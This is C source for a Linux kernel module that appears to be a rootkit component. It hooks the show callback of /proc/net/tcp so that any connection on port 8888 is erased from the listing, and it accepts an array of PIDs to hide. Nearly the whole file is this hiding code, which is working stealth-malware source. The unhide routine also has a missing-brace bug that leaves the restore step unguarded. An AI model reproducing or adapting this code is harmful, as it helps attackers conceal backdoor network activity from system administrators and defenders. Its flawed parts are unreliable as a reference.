#include <linux/moduleparam.h>
#include <linux/proc_fs.h>
#include <../fs/proc/internal.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include "sysmap.h"
#include "process_hiding.h"

#define MAX_PIDC 255
#define MAX_PID_LEN 6
static char pid_array[MAX_PIDC][MAX_PID_LEN];
static int hide_pid[MAX_PIDC];
static int pid_argc;
static int is_hidden = 0;

//union proc_op {
// int (*proc_get_link)(struct dentry *, struct path *);
// int (*proc_read)(struct task_struct *task, char *page);
// int (*proc_show)(struct seq_file *m,
// struct pid_namespace *ns, struct pid *pid,
// struct task_struct *task);
//};
//struct proc_ns {
//  void *ns;
//  const struct proc_ns_operations *ns_ops;
// };
//struct proc_inode {
//  struct pid *pid;
//  int fd;
//  union proc_op op;
//  struct proc_dir_entry *pde;
//  struct ctl_table_header *sysctl;
//  struct ctl_table *sysctl_entry;
//  struct proc_ns ns;
//  struct inode vfs_inode;
//};

struct inode *proc_inode;
struct proc_inode *proc_proc_inode;
struct proc_dir_entry *entry;
struct tcp_seq_afinfo * tcp_info;
static struct seq_operations myOP;
static struct seq_operations oldOP;
const struct file_operations *original_fops=0;

struct sock *tmp_sock;

module_param_array(hide_pid, int, &pid_argc, 0);
MODULE_PARM_DESC(hide_pid, "Array of PIDs");

struct inode * get_proc_inode(void);
static int readdir_proc (struct file*, void*, filldir_t);
static void hide_proc_tree(void);
static int my_filldir_t (void *, const char *, int, loff_t, u64, unsigned);

int (*old_seq_show)(struct seq_file*, void *) = NULL;
struct inode * get_tcp_inode(void)
{
	struct path tcp_path;
	if(kern_path("/proc/net/tcp", 0, &tcp_path))
		return NULL;
	
	return tcp_path.dentry->d_inode;
}
#define TMPSZ 150
//static int tcp4_seq_show(struct seq_file *seq, void *v)
// {
//         struct tcp_iter_state *st;
//         int len;
// 
//         if (v == SEQ_START_TOKEN) {
//                 seq_printf(seq, "%-*s\n", TMPSZ - 1,
//                            "  sl  local_address rem_address   st tx_queue "
//                            "rx_queue tr tm->when retrnsmt   uid  timeout "
//                            "inode");
//                 goto out;
//         }
//         st = seq->private;
// 
//         switch (st->state) {
//         case TCP_SEQ_STATE_LISTENING:
//         case TCP_SEQ_STATE_ESTABLISHED:
//                 get_tcp4_sock(v, seq, st->num, &len);
//                 break;
//         case TCP_SEQ_STATE_OPENREQ:
//                 get_openreq4(st->syn_wait_sk, v, seq, st->num, st->uid, &len);
//                 break;
//         case TCP_SEQ_STATE_TIME_WAIT:
//                 get_timewait4_sock(v, seq, st->num, &len);
//                 break;
//         }
//         seq_printf(seq, "%*s\n", TMPSZ - 1 - len, "");
// out:
//         return 0;
// }
//static int readdir_proc( struct file* f, void * a, filldir_t t){
//	proc_fill_dir = t;
//	
//	return original_fops->readdir(f, a, my_filldir_t);
//}

/**
 * This function is called at the beginning of a sequence.
 * ie, when:
 *	- the /proc file is read (first time)
 *	- after the function stop (end of sequence)
 *
 */
static void *my_seq_start(struct seq_file *s, loff_t *pos)
{
	static unsigned long counter = 0;

	/* beginning a new sequence ? */	
	if ( *pos == 0 )
	{	
		/* yes => return a non null value to begin the sequence */
		return &counter;
	}
	else
	{
		/* no => it's the end of the sequence, return end to stop reading */
		*pos = 0;
		return NULL;
	}
}

/**
 * This function is called after the beginning of a sequence.
 * It's called untill the return is NULL (this ends the sequence).
 *
 */
//static void *my_seq_next(struct seq_file *s, void *v, loff_t *pos)
//{
//	unsigned long *tmp_v = (unsigned long *)v;
//	(*tmp_v)++;
//	(*pos)++;
//	return NULL;
//}
//
///**
// * This function is called at the end of a sequence
// * 
// */
//static void my_seq_stop(struct seq_file *s, void *v)
//{
//	/* nothing to do, we use a static value in start() */
//}

/**
 * This function is called for each "step" of a sequence
 *
 */
static int my_seq_show(struct seq_file *s, void *v)
{
  char port[12];
  int retval=old_seq_show(s, v);
  tmp_sock = (struct sock *)v;
 // seq_printf(s, "test\n");

  sprintf(port,"%04X", 8888);
	//return ((int (*)(struct seq_file *, void *))tcp4_seq_show_t)(s, v);
  if(strnstr(s->buf+s->count-TMPSZ,port,TMPSZ))
  {
    s->count -= TMPSZ;
  }
	return retval;
}

//static int my_open(struct inode *inode, struct file *file)
//{
//	return seq_open(file, &my_seq_ops);
//};
//
///**
// * This structure gather "function" that manage the /proc file
// *
// */
//static struct file_operations my_file_ops = {
//	.owner   = THIS_MODULE,
//	.open    = my_open,
//	.read    = seq_read,
//	.llseek  = seq_lseek,
//	.release = seq_release
//};

static void hide_tcp(){
  struct seq_file *m;
	proc_inode = get_tcp_inode();
	if(proc_inode == NULL){
		printk(KERN_INFO "Couldn't obtain tcp inode\n");
	}
  else{
    proc_proc_inode = container_of(proc_inode, struct proc_inode, vfs_inode);
    entry = proc_proc_inode->pde;
		//TODO original_fops = entry->proc_fops;
    //entry->proc_fops = &my_file_ops;

    tcp_info =(struct tcp_seq_afinfo *) entry->data;
    oldOP = tcp_info->seq_ops;
    old_seq_show = oldOP.show;
    tcp_info->seq_ops.show = my_seq_show;
		is_hidden = 1;
	}
}

void hide_socket(){
	int i;
	
	
	for(i=0; i< pid_argc; i++){
		snprintf(pid_array[i], MAX_PID_LEN, "%d", hide_pid[i]); //since we don't have itoa
		printk(KERN_INFO "pid: %s\n", pid_array[i]);
	}
	hide_tcp();
} 

void unhide_socket(void){
	if(is_hidden == 1)
		//TODO entry->proc_fops = original_fops;
    oldOP.show = old_seq_show;
    tcp_info->seq_ops = oldOP;
}

